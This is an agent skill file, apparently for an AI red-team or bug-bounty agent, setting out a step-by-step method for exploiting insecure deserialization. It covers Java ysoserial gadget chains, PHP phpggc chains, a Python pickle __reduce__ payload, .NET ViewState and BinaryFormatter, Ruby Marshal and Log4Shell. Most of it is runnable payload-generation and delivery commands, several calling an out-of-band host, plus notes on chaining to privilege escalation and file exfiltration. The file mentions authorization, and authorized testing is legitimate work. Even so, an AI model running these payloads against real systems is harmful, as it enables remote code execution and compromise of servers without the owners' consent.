---
name: hunt-deserialization
description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [deserialization, hunt, redteam]
  category: redteam
---

# HUNT-DESERIALIZATION — Insecure Deserialization

## When to Use

- Target runs Java, PHP serialization, Python pickle, .NET.
- Ruby on Rails.

## Prerequisites

- Explicit authorization, target boundaries, and rate limits for the target.
- Tooling: `curl`, `interactsh-client`, `phpggc`, `python3`, `ysoserial`.
- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl --max-time 30 --connect-timeout 10 -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

## Procedure

The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

## Attack Surface Signals

### Detection Patterns
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl --max-time 30 --connect-timeout 10 -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Java Deserialization (ysoserial)
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### Phase 2 — PHP Object Injection
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phase 3 — Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 4 — .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Marshal
```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

---

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

## Automation
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

## Pitfalls

- **ysoserial payload without gadget chain** — generating a payload is not exploitation. Need to confirm the target's classpath contains the specific gadget.
- **Java deserialization vs PHP unserialize** — different languages, different tools. Don't cross-apply payloads.
- **Base64-encoded payload but server expects raw binary** — some servers accept base64, others raw. Test both encodings.
- **Content-Type mismatch** — Java deserialization typically expects `application/x-java-serialized-object` or `application/octet-stream`. Wrong Content-Type may cause silent rejection.
- **WAF deserialization filtering** — many WAFs block known ysoserial gadget signatures. The bug may still exist but require a custom gadget chain.

---

## Verification

1. **ysoserial availability** — check if ysoserial is installed:
   ```bash
   which ysoserial 2>/dev/null || ls /opt/ysoserial*.jar 2>/dev/null | head -1 && echo "PASS: ysoserial found" || echo "NOTE: ysoserial not installed"
   ```
2. **PHP deserialization test** — verify PHP payload generation:
   ```bash
   php -r "echo serialize(['test'=>'value']);" 2>/dev/null && echo "PASS: PHP serialize works" || echo "NOTE: PHP not available"
   ```
All tests verify deserialization probing.

---

## Related Skills

- **`hunt-rce`** — Deserialization is the canonical server-side RCE path. Chain primitive: Java ysoserial gadget chain (CommonsCollections6) → OS command execution as the application server user → `id` / `whoami` in response or OOB callback.
- **`hunt-aspnet`** — ASP.NET ViewState deserialization is a .NET-specific RCE class. Chain primitive: `__VIEWSTATEENCRYPTED=""` (signed-only) + leaked `<machineKey>` validationKey → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as IIS worker process.
- **`hunt-lfi`** — PHP `phar://` deserialization chains file upload with PHP object injection. Chain primitive: upload a polyglot JPEG + PHAR file → include it via `phar:///path/to/upload.jpg` → `__wakeup`/`__destruct` magic methods called → RCE via PHP gadget chain.
- **`hunt-xxe`** — XML external entity processing often pairs with XML deserialization sinks. Chain primitive: SOAP endpoint accepts XML → XXE exfiltrates `/etc/passwd` via OOB DTD → combined with Java deserialization if the XML parser uses XStream or similar.
- **`hunt-api-misconfig`** — JWT `alg:none` or weak HMAC secret is a deserialization-equivalent — the server deserializes the token payload without verifying integrity. Chain primitive: `{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.` → server accepts forged JWT payload as deserialized identity.
- **`security-arsenal`** — Reach for the Deserialization Payload Tree: ysoserial Java gadget chains (CommonsCollections, Spring, JNDI, Groovy, ROME), ysoserial.net (.NET BinaryFormatter, ViewState, ObjectStateFormatter), PHPGGC (Laravel, CodeIgniter, Zend), Python pickle `__reduce__`, Ruby Marshal `Gem::Installer`, and the JNDI/Log4Shell chain.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A Java serialized object header (`AC ED 00 05` / `rO0ABX`) in a cookie does NOT confirm the application deserializes it — confirm by sending a crafted ysoserial payload with an OOB callback. Deserialization found = Critical, but deserialization *confirmed* = the higher value.
